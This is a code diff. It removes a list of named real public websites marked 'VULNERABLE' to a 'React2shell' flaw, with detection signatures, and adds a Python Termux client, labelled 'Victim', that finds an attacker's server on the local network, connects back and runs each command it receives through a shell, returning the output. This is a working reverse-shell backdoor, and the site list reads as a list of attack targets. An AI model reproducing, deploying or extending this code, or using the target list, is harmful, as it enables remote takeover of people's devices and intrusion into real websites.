@@ -1,112 +1,196 @@
-A list of vulnerable sites, but many sites may already be protected from React2shell.
-Combolist:
-VULNERABLE
-  URL: https://www.oscar-app.com/en
-  Status: 200
-  Response Time: 863ms
-  Signature: NEXT_REDIRECT
-VULNERABLE
-  URL: https://sex.com/
-  Status: 200
-  Response Time: 1825ms
-  Signature: ^[0-9]+:I\[
-VULNERABLE
-  URL: https://imdb.com
-  Status: 200
-  Response Time: 2894ms
-  Signature: text\/x-component.*error
-VULNERABLE
-  URL: https://bigcartel.com
-  Status: 200
-  Response Time: 942ms
-  Signature: ^[0-9]+:I\[
-VULNERABLE
-  URL: https://lomadee.com
-  Status: 200
-  Response Time: 1442ms
-  Signature: ^[0-9]+:I\[
-VULNERABLE
-  URL: https://fortune.com/api/action
-  Status: 404
-  Response Time: 2219ms
-  Signature: ^[0-9]+:I\[
-VULNERABLE
-  URL: https://angieslist.com
-  Status: 200
-  Response Time: 2543ms
-  Signature: ^[0-9]+:I\[
-VULNERABLE
-  URL: https://autoblog.com
-  Status: 200
-  Response Time: 1518ms
-  Signature: ^[0-9]+:I\[
-VULNERABLE
-  URL: https://engadget.com
-  Status: 200
-  Response Time: 1933ms
-  Signature: ^[0-9]+:I\[
-VULNERABLE
-  URL: https://aparat.com
-  Status: 200
-  Response Time: 2160ms
-  Signature: ^[0-9]+:I\[
-VULNERABLE
-  URL: https://mirtesen.ru
-  Status: 404
-  Response Time: 1149ms
-  Signature: text\/x-component.*error
-VULNERABLE
-  URL: https://alternativeto.net
-  Status: 200
-  Response Time: 1417ms
-  Signature: ^[0-9]+:I\[
-VULNERABLE
-  URL: https://yandex.com
-  Status: 200
-  Response Time: 770ms
-  Signature: version-detection: react[@\/]19\.(?:0\.0|1\.[0-1]|2\.[0-1])
-VULNERABLE
-  URL: https://ya.ru/
-  Status: 200
-  Response Time: 1061ms
-  Signature: version-detection: react[@\/]19\.(?:0\.0|1\.[0-1]|2\.[0-1])
-VULNERABLE
-  URL: https://fox.com
-  Status: 200
-  Response Time: 1436ms
-  Signature: ^[0-9]+:I\[
-VULNERABLE
-  URL: https://inbox.com/api
-  Status: 200
-  Response Time: 947ms
-  Signature: ^[0-9]+:E\{
-VULNERABLE
-  URL: https://ntvspor.net
-  Status: 200
-  Response Time: 1012ms
-  Signature: ^[0-9]+:I\[
-VULNERABLE
-  URL: https://bovada.lv
-  Status: 200
-  Response Time: 1026ms
-  Signature: ^[0-9]+:I\[
-VULNERABLE
-  URL: https://capterra.com
-  Status: 200
-  Response Time: 1282ms
-  Signature: ^[0-9]+:I\[
-VULNERABLE
-  URL: https://startv.com.tr
-  Status: 200
-  Response Time: 1292ms
-  Signature: ^[0-9]+:I\[
-VULNERABLE
-  URL: https://orange.pl
-  Status: 200
-  Response Time: 1659ms
-  Signature: ^[0-9]+:I\[
-VULNERABLE
-  URL: https://iol.co.za
-  Status: 200
-  Response Time: 965ms
-  Signature: ^[0-9]+:I\[
+#!/usr/bin/env python3
+import socket
+import subprocess
+import os
+import sys
+import time
+
+print("""
+╔══════════════════════════════════════════════════╗
+║           RTernux Client (Victim)                ║
+╚══════════════════════════════════════════════════╝
+""")
+
+def discover_server():
+    """Ищем сервер злоумышленника в локальной сети"""
+    print("🔍 Поиск сервера злоумышленника в локальной сети...")
+    
+    listen_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    listen_socket.settimeout(10)
+    
+    try:
+        listen_socket.bind(('', 7157))
+        
+        print("📡 Сканирование сети...")
+        for i in range(30):
+            try:
+                data, addr = listen_socket.recvfrom(1024)
+                message = data.decode()
+                
+                if message.startswith("RTernux:"):
+                    parts = message.split(":")
+                    if len(parts) >= 3:
+                        server_ip = parts[2]
+                        server_port = int(parts[1])
+                        print(f"✅ Найден сервер: {server_ip}:{server_port}")
+                        listen_socket.close()
+                        return server_ip, server_port
+                        
+            except socket.timeout:
+                print(f"⏳ Поиск... ({i+1}/30)")
+                continue
+                
+    except Exception as e:
+        print(f"⚠️  Ошибка поиска: {e}")
+    
+    listen_socket.close()
+    return None, None
+
+def connect_to_server(server_ip, server_port=7156):
+    """Подключаемся к серверу"""
+    print(f"\n🔗 Подключение к {server_ip}:{server_port}...")
+    
+    for attempt in range(1, 6):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((server_ip, server_port))
+            
+            welcome = sock.recv(1024).decode()
+            print(f"✅ УСПЕШНО ПОДКЛЮЧЕНО!")
+            print(f"📩 {welcome}")
+            print(f"\n⚠️  ВНИМАНИЕ: Злоумышленник получил доступ к вашему Termux!")
+            print("="*60)
+            
+            return sock
+            
+        except ConnectionRefusedError:
+            print(f"❌ Попытка {attempt}/5: Сервер недоступен")
+            time.sleep(2)
+        except socket.timeout:
+            print(f"❌ Попытка {attempt}/5: Таймаут")
+            time.sleep(2)
+        except Exception as e:
+            print(f"❌ Попытка {attempt}/5: {e}")
+            time.sleep(2)
+    
+    return None
+
+def execute_command(command):
+    """Выполняем команду на устройстве жертвы"""
+    try:
+        # Логируем команду (в домашней директории Termux)
+        log_path = os.path.join(os.path.expanduser("~"), ".rternux.log")
+        try:
+            with open(log_path, "a") as f:
+                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {command}\n")
+        except:
+            pass  # Игнорируем ошибки логирования
+        
+        # Обработка cd
+        if command.strip().startswith('cd '):
+            path = command.strip()[3:].strip()
+            if not path:
+                path = os.path.expanduser("~")
+            try:
+                os.chdir(path)
+                return f"Текущая директория: {os.getcwd()}\n__END__"
+            except Exception as e:
+                return f"Ошибка: {e}\n__END__"
+        
+        # Выполняем команду
+        try:
+            process = subprocess.run(
+                command,
+                shell=True,
+                capture_output=True,
+                text=True,
+                cwd=os.getcwd(),
+                timeout=30
+            )
+            
+            result = process.stdout
+            if process.stderr:
+                if result:
+                    result += f"\nОшибка: {process.stderr}"
+                else:
+                    result = f"Ошибка: {process.stderr}"
+            
+            if not result:
+                result = "✅ Команда выполнена"
+            
+            return result + "\n__END__"
+            
+        except subprocess.TimeoutExpired:
+            return "❌ Таймаут (30 секунд)\n__END__"
+        except Exception as e:
+            return f"❌ Ошибка выполнения: {str(e)}\n__END__"
+        
+    except Exception as e:
+        return f"❌ Общая ошибка: {str(e)}\n__END__"
+
+def victim_main():
+    """Основная функция жертвы"""
+    # Ищем сервер в сети
+    server_ip, server_port = discover_server()
+    
+    if not server_ip:
+        print("❌ Сервер не найден в локальной сети")
+        print("Убедитесь, что злоумышленник запустил server.py")
+        return
+    
+    # Подключаемся к серверу
+    sock = connect_to_server(server_ip, server_port)
+    if not sock:
+        print("❌ Не удалось подключиться")
+        return
+    
+    print("🎮 Режим жертвы активирован")
+    print("Все команды злоумышленника будут выполняться\n")
+    
+    try:
+        while True:
+            try:
+                sock.settimeout(0.5)
+                
+                try:
+                    data = sock.recv(4096)
+                except socket.timeout:
+                    continue
+                
+                if not data:
+                    print("❌ Соединение разорвано")
+                    break
+                
+                command = data.decode().strip()
+                
+                # Проверка на выход
+                if command.lower() == 'exit':
+                    print("👋 Злоумышленник отключился")
+                    sock.send("Сессия завершена\n__END__".encode())
+                    break
+                
+                # Выполняем команду
+                result = execute_command(command)
+                
+                # Отправляем результат
+                sock.send(result.encode())
+                
+            except ConnectionResetError:
+                print("❌ Соединение сброшено")
+                break
+            except KeyboardInterrupt:
+                print("\n⚠️  Остановлено жертвой")
+                sock.send("Клиент отключен\n__END__".encode())
+                break
+            except Exception as e:
+                print(f"⚠️  Ошибка: {e}")
+                continue
+                
+    finally:
+        sock.close()
+        print("\n👋 Отключено от злоумышленника")
+
+if __name__ == "__main__":
+    victim_main()
